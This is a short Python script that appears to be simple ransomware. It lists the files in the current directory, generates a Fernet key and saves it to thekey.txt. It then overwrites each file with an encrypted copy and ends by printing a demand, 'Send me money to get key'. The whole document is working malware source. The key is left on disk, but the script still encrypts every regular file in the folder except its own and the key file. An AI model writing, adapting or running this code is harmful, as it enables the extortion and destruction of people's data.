#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet



def append_files():
    for file in os.listdir():
        # Lists directories and if target in directory is a file, append to list

        if file == "Ransomware.py" or file == "thekey.txt" or file == "Decrypt_Ransomware.py":
            continue
        if os.path.isfile(file):
            files.append(file)

def write_key(key):
    with open("thekey.txt", "wb") as file_with_key:
        file_with_key.write(key)

def encrypt(files,key):
    for file in files:
        with open(file, "rb") as attacked_file:
            file_contents = attacked_file.read()
        contents_encrypted = Fernet(key).encrypt(file_contents)
        with open(file, "wb") as attacked_file:
            attacked_file.write(contents_encrypted)
        print(f"Encrypted filename: {file}")


if __name__ == "__main__":
    files = []
    key = Fernet.generate_key()
    append_files()
    write_key(key)
    encrypt(files,key)
    print("\nSend me money to get key")
